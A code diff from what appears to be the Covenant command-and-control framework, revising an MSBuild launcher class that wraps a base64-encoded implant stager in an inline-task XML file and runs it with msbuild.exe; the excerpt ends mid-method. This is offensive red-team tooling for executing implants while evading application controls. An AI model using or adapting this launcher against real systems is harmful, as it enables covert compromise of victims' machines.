@@ -6,7 +6,6 @@ using System;
 using System.Linq;
 using Microsoft.CodeAnalysis;
 
-using Covenant.Core;
 using Covenant.Models.Grunts;
 using Covenant.Models.Listeners;
 
@@ -19,29 +18,27 @@ namespace Covenant.Models.Launchers
 
         public MSBuildLauncher()
         {
+            this.Name = "MSBuild";
             this.Type = LauncherType.MSBuild;
             this.Description = "Uses msbuild.exe to launch a Grunt using an in-line task.";
             this.OutputKind = OutputKind.WindowsApplication;
             this.CompressStager = true;
-            this.DotNetVersion = Core.Common.DotNetVersion.Net40;
         }
 
-        public override string GetFilename() => Utilities.GetSanitizedFilename(this.Name) + ".xml";
-
-        public override string GetLauncherString(string StagerCode, byte[] StagerAssembly, Grunt grunt, ImplantTemplate template)
+        public override string GetLauncher(string StagerCode, byte[] StagerAssembly, Grunt grunt, ImplantTemplate template)
         {
             this.StagerCode = StagerCode;
-            this.LauncherILBytes = StagerAssembly;
-            string code = XMLTemplate.Replace("{{GRUNT_IL_BYTE_STRING}}", Convert.ToBase64String(this.LauncherILBytes));
-            code = code.Replace("{{TARGET_NAME}}", this.TargetName);
-            code = code.Replace("{{TASK_NAME}}", this.TaskName);
-            this.DiskCode = Common.CovenantEncoding.GetBytes(code);
+            this.Base64ILByteString = Convert.ToBase64String(StagerAssembly);
+            this.DiskCode = XMLTemplate.Replace("{{GRUNT_IL_BYTE_STRING}}", this.Base64ILByteString);
+            this.DiskCode = DiskCode.Replace("{{TARGET_NAME}}", this.TargetName);
+            this.DiskCode = DiskCode.Replace("{{TASK_NAME}}", this.TaskName);
 
-            this.LauncherString = $"msbuild.exe {this.GetFilename()}";
+            string launcher = "msbuild.exe" + " " + template.Name + ".xml";
+            this.LauncherString = launcher;
             return this.LauncherString;
         }
 
-        public override string GetHostedLauncherString(Listener listener, HostedFile hostedFile)
+        public override string GetHostedLauncher(Listener listener, HostedFile hostedFile)
         {
             HttpListener httpListener = (HttpListener)listener;
             if (httpListener != null)
